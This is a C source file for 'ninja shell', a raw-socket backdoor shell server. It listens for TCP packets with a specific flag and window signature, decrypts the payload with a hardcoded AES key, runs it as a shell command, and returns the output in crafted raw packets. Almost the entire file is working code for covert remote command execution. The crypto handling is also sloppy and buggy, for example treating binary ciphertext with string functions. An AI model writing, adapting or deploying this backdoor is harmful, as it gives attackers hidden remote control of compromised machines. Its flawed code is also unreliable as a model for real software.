/*
Author:Antonio Costa aka " Cooler_ "
contact: c00f3r[at]gmail[dot]com

    Copyright (C) 2013 ninja shell authors,
    
    This file is part of ninja shell
    
    ninja shell is free software: you can redistribute it and/or modify
    it under the terms of the GNU Lesser General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    ninja shell is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Lesser General Public License for more details.

    You should have received a copy of the GNU Lesser General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

Thanks: Iak(Tiago Natel),m0nad(Victor Ramos)

What is this ?
just another raw socket shell server
 

*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <alloca.h>
#include <string.h> 
#define PORT  667
#define MAX    9192
#define ERRO   -1
#include <openssl/pem.h>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <openssl/evp.h>
 unsigned char key[]="magic1337";
 unsigned char iv[16]="1234567890123456";
 unsigned char aad[16]="abcdefghijklmnop"; 
 int k=0;
#include <assert.h>
#include <limits.h>
#include <stdint.h>
#include <stddef.h>

#define MUL_NO_OVERFLOW	((size_t)1 << (sizeof(size_t)*4))
void *xmallocarray (size_t nmemb, size_t size);


char *encode64 (const void *b64_encode_this, int encode_this_many_bytes);
char *decode64 (const void *b64_decode_this, int decode_this_many_bytes);
void fazerpacote(char * dest_addr, unsigned short dest_port,char *payload); 
unsigned short in_cksum(unsigned short *, int);   
int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad, int aad_len, unsigned char *key, unsigned char *iv, unsigned char *ciphertext, unsigned char *tag);
int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad, int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv, unsigned char *plaintext);

void handleErrors()
{
  printf("Some error occured in  encryption function\n");
}

int main(void)
{
	FILE *fpipe;
 	int  sockfd=0,counter=0;
 	char buffer[MAX],line[MAX];
 	char ip_tmp[INET_ADDRSTRLEN];
 	struct iphdr *iphr;
 	struct tcphdr *tcphr;

 	bzero(buffer,MAX);
 	iphr = (struct iphdr *) buffer;
 	tcphr = (struct tcphdr *) (buffer + sizeof(struct iphdr));

 	if((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP)) == ERRO)
  		exit(ERRO);


 	while(read(sockfd, buffer, sizeof (buffer)-1)) 
 	{
  		if((ntohs(tcphr->dest)==PORT)&&(tcphr->fin == 1)&&(tcphr->psh == 1) && (tcphr->urg == 1) && (tcphr->window == htons(10666))) 
  		{
            		unsigned char plaintext[1024],ciphertext[1024+EVP_MAX_BLOCK_LENGTH],tag[100],pt[1024+EVP_MAX_BLOCK_LENGTH];
    			counter=sizeof(struct tcphdr) + sizeof(struct iphdr);
    			inet_ntop(AF_INET,&(iphr->saddr),ip_tmp,INET_ADDRSTRLEN);
            		unsigned char *decode_64_input=decode64(buffer+counter,strlen(buffer+counter));
            		memset(pt,0,1024);
            		k = decrypt(decode_64_input, strlen(decode_64_input), aad, sizeof(aad), tag, key, iv, pt);
            		char *decode_64_output=decode64(pt,strlen(pt));
            		int sizedecode=strlen(decode_64_output);
    			char *cmd2=xmallocarray(sizedecode+1,sizeof(char));
            		memset(cmd2,0,sizedecode);
    			snprintf(cmd2,sizedecode+1*sizeof(char),"%s",decode_64_output);


    				if ( !(fpipe = (FILE *)popen (cmd2,"r")) ) 
    				{
     					puts("error on pipe");
     					exit(1);
    				}

    				while (fgets (line, sizeof line, fpipe)) 
    				{
              				unsigned char plaintext2[1024],ciphertext2[1024+EVP_MAX_BLOCK_LENGTH],tag2[100],pt2[1024+EVP_MAX_BLOCK_LENGTH];
       //       printf("debug show result cmd %s\n",line);
              				unsigned char *encode_64_input2=encode64(line,strlen((char *)line));
              				k = encrypt(encode_64_input2, strlen(encode_64_input2), aad, sizeof(aad), key, iv, ciphertext2, tag2);
              				char *encode_64_output2=encode64(ciphertext2,strlen((char *)ciphertext2));
     					fazerpacote(ip_tmp,PORT,encode_64_output2);
     					bzero(line,MAX);
     					free(encode_64_input2);
              free(encode_64_output2);
    				}

    			pclose(fpipe);
    			free(decode_64_input);
    			free(cmd2);
    				

  		}

  		bzero(buffer,MAX);
 	}

 exit(1);
}


// based in OpenBSD reallocarray() function http://man.openbsd.org/reallocarray.3
void *xmallocarray (size_t nmemb, size_t size) 
{
	if ((nmemb >= MUL_NO_OVERFLOW || size >= MUL_NO_OVERFLOW) && nmemb > 0 && SIZE_MAX / nmemb < size) 
	{
		puts("integer overflow block");
		exit(0);
	}

	void *ptr = malloc (nmemb*size);

	if (ptr == NULL)
	{
 
		puts("error in xmallocarray() function");
		exit(0);
	}

	return ptr;
}


     
void fazerpacote(char *dest_addr, unsigned short dest_port, char * payload)
{    

 char packet[sizeof (struct iphdr) + sizeof (struct tcphdr) + MAX];
 struct envio {    
  struct iphdr *ip;    
  struct tcphdr *tcp;
 } envio;    

 struct pseudo_header {    
  unsigned int source_address;    
  unsigned int dest_address;    
  unsigned char placeholder;    
  unsigned char protocol;    
  unsigned short tcp_length;    
  char* data;
 };
     
 int tcp_socket;   
 struct sockaddr_in sin; 
 unsigned int destino;
 
 	envio.ip = (struct iphdr*) packet;
 	envio.tcp = (struct tcphdr*) (packet + sizeof (struct iphdr));
 	struct pseudo_header pseudo_header; 
 	char* data = packet +  sizeof(struct iphdr) + sizeof(struct tcphdr);
 
 	const char* message = payload;
 	strncpy(data, message, strlen(message));
 
 	inet_pton(PF_INET, dest_addr, &destino);
 
 	bzero(packet, sizeof(struct iphdr)); 
         
//setamos variaveis do pacote ip   
 	envio.ip->ihl = 5;    
 	envio.ip->version = 4;    
 	envio.ip->tos = 0;    
 	envio.ip->tot_len = htons(sizeof(struct iphdr) + MAX);  
 	envio.ip->id = dest_port;    
 	envio.ip->frag_off = 0;    
 	envio.ip->ttl = 255;    
 	envio.ip->protocol = IPPROTO_TCP;    
 	envio.ip->check = 0;    
// envio.ip->saddr = remetente;    
 	envio.ip->daddr = destino;    
        
//setamos variaveis do pacote TCP    
 	envio.tcp->source = dest_port;    
 	envio.tcp->dest = htons(dest_port);    
 	envio.tcp->seq = dest_port;          
 	envio.tcp->res1 = 0;
 	envio.tcp->res2 = 0;     
 	envio.tcp->doff = 5;    
 	envio.tcp->ack = 0; 
 	envio.tcp->ack_seq = 0;    
 	envio.tcp->urg_ptr = 0;        
 	envio.tcp->window = htons(10666);    
 	envio.tcp->check = 0;   
//flags 
 	envio.tcp->fin = 1;    
 	envio.tcp->syn = 0;    
 	envio.tcp->rst = 0;    
 	envio.tcp->psh = 1;  
 	envio.tcp->urg = 1;  
 	envio.tcp->ack = 0; 
                
 	sin.sin_family = AF_INET;    
 	sin.sin_port = envio.tcp->source;    
 	sin.sin_addr.s_addr = envio.ip->daddr;       
        
// abrimos a socket   
  	tcp_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);    

  	if(tcp_socket < 0) 
  	{    
   		perror("socket");    
   		exit(1);    
  	}    
        
// setamos os campos que precisão ser mudados   
  	envio.tcp->source++;    
  	envio.ip->id++;    
  	envio.tcp->seq++;    
  	envio.tcp->check = 0;    
  	envio.ip->check = 0;    
       
// checksum   
  	envio.ip->check = in_cksum((unsigned short *)&envio.ip, sizeof (struct iphdr)); 
     
// setamos campo dos cabeçalhos     
  	pseudo_header.source_address = envio.ip->saddr;    
  	pseudo_header.dest_address = envio.ip->daddr;    
  
  	pseudo_header.protocol = IPPROTO_TCP;    
  	pseudo_header.tcp_length = htons(sizeof(struct tcphdr) + MAX);
  	pseudo_header.data = data;

  	envio.tcp->check = in_cksum((unsigned short *)&pseudo_header, sizeof(struct tcphdr) + sizeof(struct pseudo_header) + MAX); //32    

 // Voce precisa setar HDRINCL no seu socket para o kernel aceitar a sua definicao do iphdr
  	int one = 1;
  	const int *val = &one;

  	if (setsockopt (tcp_socket, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    		printf ("Warning: Cannot set HDRINCL!\n");

  	if (sendto(tcp_socket, packet, ntohs(envio.ip->tot_len), 0, (struct sockaddr *)&sin, sizeof(struct sockaddr_in)) < 0) 
  	{
    		fprintf(stderr, "sendto error...\n");
    		perror("ops");
    		close(tcp_socket);    
    		exit(1);
  	} 
    
	close(tcp_socket);    
}    
     
//calculo feito afim de checar a integridade 
unsigned short in_cksum(unsigned short *ptr, int nbytes) 
{    
 	register u_short    answer;     // u_short == 16 bits   
 	register long       sum;        // long == 32 bits    
 	u_short         oddbyte;     
     
 	sum = 0;
   
 	while(nbytes > 1)  
 	{    
  		sum += *ptr++;   
  		nbytes -= 2;    
 	}    
                        
 	if(!(nbytes^1)) 
 	{    
  		oddbyte = 0;       
  		*((u_char *) &oddbyte) = *(u_char *)ptr;      
  		sum += oddbyte;    
 	}    
     
 	sum = (sum >> 16) + (sum & 0xffff);  // addicina auto-16 para baixo-16     
 	sum += (sum >> 16);           
 	answer = ~sum;  
       
 	return(answer);    
}    



char *encode64 (const void *b64_encode_this, int encode_this_many_bytes)
{
    	BIO *b64_bio, *mem_bio;     
    	BUF_MEM *mem_bio_mem_ptr;  
  
    	b64_bio = BIO_new(BIO_f_base64());       
    	mem_bio = BIO_new(BIO_s_mem());                         
    	BIO_push(b64_bio, mem_bio);           
    	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);  
    	BIO_write(b64_bio, b64_encode_this, encode_this_many_bytes); 
    	BIO_flush(b64_bio);   
    	BIO_get_mem_ptr(mem_bio, &mem_bio_mem_ptr);  
    	BIO_set_close(mem_bio, BIO_NOCLOSE);   
    	BIO_free_all(b64_bio); 
    	BUF_MEM_grow(mem_bio_mem_ptr, (*mem_bio_mem_ptr).length + 1);   
    	(*mem_bio_mem_ptr).data[(*mem_bio_mem_ptr).length] = '\0';  

    	return (*mem_bio_mem_ptr).data; 
}

char *decode64 (const void *b64_decode_this, int decode_this_many_bytes)
{
    	BIO *b64_bio, *mem_bio;     
    	char *base64_decoded = calloc( (decode_this_many_bytes*3)/4+1, sizeof(char) ); 

    	b64_bio = BIO_new(BIO_f_base64());                     
    	mem_bio = BIO_new(BIO_s_mem());                        
    	BIO_write(mem_bio, b64_decode_this, decode_this_many_bytes); 
    	BIO_push(b64_bio, mem_bio);          
    	BIO_set_flags(b64_bio, BIO_FLAGS_BASE64_NO_NL);        
    	int decoded_byte_index = 0;   

    	while ( 0 < BIO_read(b64_bio, base64_decoded+decoded_byte_index, 1) ){ 
        	decoded_byte_index++; 
    	} 

    	BIO_free_all(b64_bio);  

    	return base64_decoded;       
}


int encrypt(unsigned char *plaintext, int plaintext_len, unsigned char *aad,
  int aad_len, unsigned char *key, unsigned char *iv,
  unsigned char *ciphertext, unsigned char *tag)
{
  EVP_CIPHER_CTX *ctx;

  int len=0, ciphertext_len=0;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new()))
    handleErrors();

  /* Initialise the encryption operation. */
  if(1 != EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
    handleErrors();

  /* Set IV length if default 12 bytes (96 bits) is not appropriate */
  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
    handleErrors();

  /* Initialise key and IV */
  if(1 != EVP_EncryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();

  /* Provide any AAD data. This can be called zero or more times as
   * required
   */
  if(1 != EVP_EncryptUpdate(ctx, NULL, &len, aad, aad_len))
    handleErrors();

  /* Provide the message to be encrypted, and obtain the encrypted output.
   * EVP_EncryptUpdate can be called multiple times if necessary
   */
  /* encrypt in block lengths of 16 bytes */
   while(ciphertext_len<=plaintext_len-16)
   {
    if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, plaintext+ciphertext_len, 16))
      handleErrors();
    ciphertext_len+=len;
   }
   if(1 != EVP_EncryptUpdate(ctx, ciphertext+ciphertext_len, &len, plaintext+ciphertext_len, plaintext_len-ciphertext_len))
    handleErrors();
   ciphertext_len+=len;

  /* Finalise the encryption. Normally ciphertext bytes may be written at
   * this stage, but this does not occur in GCM mode
   */
  if(1 != EVP_EncryptFinal_ex(ctx, ciphertext + ciphertext_len, &len)) handleErrors();
  ciphertext_len += len;

  /* Get the tag */
  if(1 != EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, tag))
    handleErrors();

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  return ciphertext_len;
}


int decrypt(unsigned char *ciphertext, int ciphertext_len, unsigned char *aad,
  int aad_len, unsigned char *tag, unsigned char *key, unsigned char *iv,
  unsigned char *plaintext)
{
  EVP_CIPHER_CTX *ctx;
  int len=0, plaintext_len=0, ret;

  /* Create and initialise the context */
  if(!(ctx = EVP_CIPHER_CTX_new())) 
    handleErrors();

  /* Initialise the decryption operation. */
  if(!EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), NULL, NULL, NULL))
    handleErrors();

  /* Set IV length. Not necessary if this is 12 bytes (96 bits) */
  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 16, NULL))
    handleErrors();

  /* Initialise key and IV */
  if(!EVP_DecryptInit_ex(ctx, NULL, NULL, key, iv)) handleErrors();

  /* Provide any AAD data. This can be called zero or more times as
   * required
   */
  if(!EVP_DecryptUpdate(ctx, NULL, &len, aad, aad_len))
    handleErrors();

  /* Provide the message to be decrypted, and obtain the plaintext output.
   * EVP_DecryptUpdate can be called multiple times if necessary
   */
   while(plaintext_len<=ciphertext_len-16)
   {
    if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, 16))
      handleErrors();
    plaintext_len+=len;
   }
   if(1!=EVP_DecryptUpdate(ctx, plaintext+plaintext_len, &len, ciphertext+plaintext_len, ciphertext_len-plaintext_len))
      handleErrors();
   plaintext_len+=len;

  /* Set expected tag value. Works in OpenSSL 1.0.1d and later */
  if(!EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, tag))
    handleErrors();

  /* Finalise the decryption. A positive return value indicates success,
   * anything else is a failure - the plaintext is not trustworthy.
   */
  ret = EVP_DecryptFinal_ex(ctx, plaintext + plaintext_len, &len);

  /* Clean up */
  EVP_CIPHER_CTX_free(ctx);

  if(ret > 0)
  {
    /* Success */
    plaintext_len += len;
    return plaintext_len;
  }
  else
  {
    /* Verify failed */
    return -1;
  }
}

